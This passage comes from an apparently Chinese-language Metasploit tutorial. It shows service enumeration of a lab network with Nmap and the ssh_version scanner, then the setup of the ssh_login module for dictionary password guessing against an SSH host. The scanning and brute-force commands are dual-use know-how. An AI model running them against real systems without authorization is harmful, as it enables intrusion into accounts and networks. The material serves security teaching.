      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49152<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49153<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49154<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49155<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:50 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49156<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>service</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host-id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>host-id</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>created-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>created-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>49157<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proto</span><span class="token punctuation">></span></span>tcp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>proto</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>state</span><span class="token punctuation">></span></span>open<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>state</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>msrpc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updated-at</span><span class="token punctuation">></span></span>2020-06-24 08:26:51 UTC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updated-at</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>info</span><span class="token punctuation">></span></span>Microsoft Windows RPC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>info</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>service</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>services</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web_sites</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web_sites</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web_pages</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web_pages</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web_forms</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web_forms</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web_vulns</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web_vulns</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module_details</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module_details</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MetasploitV5</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>调用执行系统Nmap</li>
</ul>
<p>在msf控制台中可以调用系统中的命令，比如可以使用 Nmap 探测目标的详细服务信息。</p>
<pre><code>nmap -sV -p- 192.33.6.151</code></pre><pre><code>msf5 &gt; nmap -sV -p- 192.33.6.151
[*] exec: nmap -sV -p- 192.33.6.151

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 22:19 EDT
Nmap scan report for 192.33.6.151
Host is up (0.00034s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 00:0C:29:FB:6F:2E (VMware)
Service Info: Host: WIN-5DTIE0M734E; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.81 seconds
msf5 &gt; </code></pre><h3 id="服务查点"><a href="#服务查点" class="headerlink" title="服务查点"></a>服务查点</h3><p>很多网络服务是漏洞频发的高危对象，对网络上的特定服务进行扫描，往往能让我们少走弯路，增加渗透成功的几率。确定开放端口后，通常会对相应端口，上所运行服务的信息进行更深人的挖掘，通常称为服务查点。</p>
<p>在 Metasploit 的辅助模块中，有很多用于服务扫描和查点的工具，这些工具通常以</p>
<pre><code>[service_name]_version</code></pre><p>命名。该模块可用于遍历网络中包含某种服务的主机，并进一步确定服务的版本。</p>
<ul>
<li>SSH 服务查点</li>
</ul>
<p>SSH是类UNIX系统上最常见的远程管理服务，与Telnet 不同的是，它采用了安全的加密信息传输方式。通常管理员会使用SSH对服务器进行远程管理，服务器会向SSH客户端返回一个远程的Shell连接。如果没有做其他的安全增强配置(如限制管理登录的IP地址)，只要获取服务器的登录口令，就可以使用SSH客户端登录服务器，那就相当于获得了相应登录用户的所有权限。</p>
<p>扫描网络中开放 SSH 服务的所有主机。</p>
<pre><code>ssh_version
use auxiliary/scanner/ssh/ssh_version</code></pre><pre><code>msf5 auxiliary(scanner/portscan/syn) &gt; use auxiliary/scanner/ssh/ssh_version 
msf5 auxiliary(scanner/ssh/ssh_version) &gt; info

       Name: SSH Version Scanner
     Module: auxiliary/scanner/ssh/ssh_version
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Daniel van Eeden &lt;metasploit@myname.nl&gt;

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
  RPORT    22               yes       The target port (TCP)
  THREADS  1                yes       The number of concurrent threads (max one per host)
  TIMEOUT  30               yes       Timeout for the SSH probe

Description:
  Detect SSH Version.

References:
  http://en.wikipedia.org/wiki/SecureShell

msf5 auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.33.6.0/24
rhosts =&gt; 192.33.6.0/24
msf5 auxiliary(scanner/ssh/ssh_version) &gt; set threads 50
threads =&gt; 50
msf5 auxiliary(scanner/ssh/ssh_version) &gt; set timeout 10
timeout =&gt; 10
msf5 auxiliary(scanner/ssh/ssh_version) &gt; run

[*] 192.33.6.0/24:22      - Scanned  52 of 256 hosts (20% complete)
[*] 192.33.6.0/24:22      - Scanned  79 of 256 hosts (30% complete)
[*] 192.33.6.0/24:22      - Scanned 102 of 256 hosts (39% complete)
[+] 192.33.6.150:22       - SSH server version: SSH-2.0-OpenSSH_8.1p1 Debian-5 ( service.version=8.1p1 openssh.comment=Debian-5 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:8.1p1 os.vendor=Debian os.family=Linux os.product=Linux os.cpe23=cpe:/o:debian:debian_linux:- service.protocol=ssh fingerprint_db=ssh.banner )
[*] 192.33.6.0/24:22      - Scanned 117 of 256 hosts (45% complete)
[*] 192.33.6.0/24:22      - Scanned 138 of 256 hosts (53% complete)
[*] 192.33.6.0/24:22      - Scanned 178 of 256 hosts (69% complete)
[*] 192.33.6.0/24:22      - Scanned 194 of 256 hosts (75% complete)
[*] 192.33.6.0/24:22      - Scanned 222 of 256 hosts (86% complete)
[*] 192.33.6.0/24:22      - Scanned 231 of 256 hosts (90% complete)
[*] 192.33.6.0/24:22      - Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_version) &gt; </code></pre><p>从结果看到，检测到主机<code>192.33.6.150</code>开放了22端口SSH服务</p>
<ul>
<li>其他服务查点</li>
</ul>
<p>使用search进行特定搜索</p>
<pre><code>msf5 &gt; search type:auxiliary path:_version

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank    Check  Description
   -   ----                                                     ---------------  ----    -----  -----------
   0   auxiliary/fuzzers/ssh/ssh_version_15                                      normal  No     SSH 1.5 Version Fuzzer
   1   auxiliary/fuzzers/ssh/ssh_version_2                                       normal  No     SSH 2.0 Version Fuzzer
   2   auxiliary/fuzzers/ssh/ssh_version_corrupt                                 normal  No     SSH Version Corruption
   3   auxiliary/gather/ibm_sametime_version                    2013-12-27       normal  No     IBM Lotus Sametime Version Enumeration
   4   auxiliary/scanner/db2/db2_version                                         normal  No     DB2 Probe Utility
   5   auxiliary/scanner/ftp/ftp_version                                         normal  No     FTP Version Scanner
   6   auxiliary/scanner/h323/h323_version                                       normal  No     H.323 Version Scanner
   7   auxiliary/scanner/http/coldfusion_version                                 normal  No     ColdFusion Version Scanner
   8   auxiliary/scanner/http/docker_version                                     normal  No     Docker Server Version Scanner
   9   auxiliary/scanner/http/http_version                                       normal  No     HTTP Version Detection
   10  auxiliary/scanner/http/joomla_version                                     normal  No     Joomla Version Scanner
   11  auxiliary/scanner/http/sap_businessobjects_version_enum                   normal  No     SAP BusinessObjects Version Detection
   12  auxiliary/scanner/http/ssl_version                       2014-10-14       normal  No     HTTP SSL/TLS Version Detection (POODLE scanner)
   13  auxiliary/scanner/imap/imap_version                                       normal  No     IMAP4 Banner Grabber
   14  auxiliary/scanner/ipmi/ipmi_version                                       normal  No     IPMI Information Discovery
   15  auxiliary/scanner/lotus/lotus_domino_version                              normal  No     Lotus Domino Version
   16  auxiliary/scanner/memcached/memcached_udp_version        2003-07-23       normal  No     Memcached UDP Version Scanner
   17  auxiliary/scanner/mysql/mysql_version                                     normal  No     MySQL Server Version Enumeration
   18  auxiliary/scanner/oracle/tnslsnr_version                 2009-01-07       normal  No     Oracle TNS Listener Service Version Query
   19  auxiliary/scanner/pop3/pop3_version                                       normal  No     POP3 Banner Grabber
   20  auxiliary/scanner/postgres/postgres_version                               normal  No     PostgreSQL Version Probe
   21  auxiliary/scanner/printer/printer_version_info                            normal  No     Printer Version Information Scanner
   22  auxiliary/scanner/sap/sap_mgmt_con_version                                normal  No     SAP Management Console Version Detection
   23  auxiliary/scanner/scada/digi_addp_version                                 normal  No     Digi ADDP Information Discovery
   24  auxiliary/scanner/scada/digi_realport_version                             normal  No     Digi RealPort Serial Server Version
   25  auxiliary/scanner/smb/smb_version                                         normal  No     SMB Version Detection
   26  auxiliary/scanner/smtp/smtp_version                                       normal  No     SMTP Banner Grabber
   27  auxiliary/scanner/snmp/aix_version                                        normal  No     AIX SNMP Scanner Auxiliary Module
   28  auxiliary/scanner/ssh/ssh_version                                         normal  No     SSH Version Scanner
   29  auxiliary/scanner/telnet/lantronix_telnet_version                         normal  No     Lantronix Telnet Service Banner Detection
   30  auxiliary/scanner/telnet/telnet_version                                   normal  No     Telnet Service Banner Detection
   31  auxiliary/scanner/vmware/vmauthd_version                                  normal  No     VMWare Authentication Daemon Version Scanner
   32  auxiliary/scanner/vxworks/wdbrpc_version                                  normal  No     VxWorks WDB Agent Version Scanner

msf5 &gt; 
</code></pre><h3 id="口令猜测"><a href="#口令猜测" class="headerlink" title="口令猜测"></a>口令猜测</h3><p>对于发现的系统与文件管理类网络服务，比如Telnet、SSH、 FTP 等，可以进行弱口令的猜测，以及对明文传输口令的嗅探，从而尝试获取直接通过这些服务进人目标网络的通道。</p>
<p>同样在 Metasploit 的辅助模块中，有很多用于服务口令猜解的工具，这些工具通常以</p>
<pre><code>[service_name]_login</code></pre><p>命名。</p>
<ul>
<li>SSH 服务口令猜解</li>
</ul>
<p>在确定了网络上的 SSH 服务之后，可以使用 MSF 中的<code>ssh_login</code> 模块对 SSH 服务进行口令猜测攻击，在进行口令攻击之前，需要一个好用的用户名和口令字典。</p>
<pre><code>msf5 &gt; use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) &gt; show options 

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.33.6.150
rhosts =&gt; 192.33.6.150
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set UseR_FILE /home/qftm/Desktop/dic/user
UseR_FILE =&gt; /home/qftm/Desktop/dic/user
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set PaSS_FiLE /home/qftm/Desktop/dic/pass
PaSS_FiLE =&gt; /home/qftm/Desktop/dic/pass
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set BLANK_PASSWORDS true
BLANK_PASSWORDS =&gt; true
msf5 auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE true
VERBOSE =&gt; true
msf5 auxiliary(scanner/ssh/ssh_login) &gt; show options 

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting              Required  Description
   ----              ---------------              --------  -----------
   BLANK_PASSWORDS   true                         no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                            yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                        no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                        no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                        no        Add all users in the current database to the list
   PASSWORD                                       no        A specific password to authenticate with
   PASS_FILE         /home/qftm/Desktop/dic/pass  no        File containing passwords, one per line
   RHOSTS            192.33.6.150                 yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT             22                           yes       The target port
   STOP_ON_SUCCESS   false                        yes       Stop guessing when a credential works for a host
   THREADS           1                            yes       The number of concurrent threads (max one per host)
   USERNAME                                       no        A specific username to authenticate as
   USERPASS_FILE                                  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                        no        Try the username as the password for all users
   USER_FILE         /home/qftm/Desktop/dic/user  no        File containing usernames, one per line
   VERBOSE           true                         yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) &gt;run
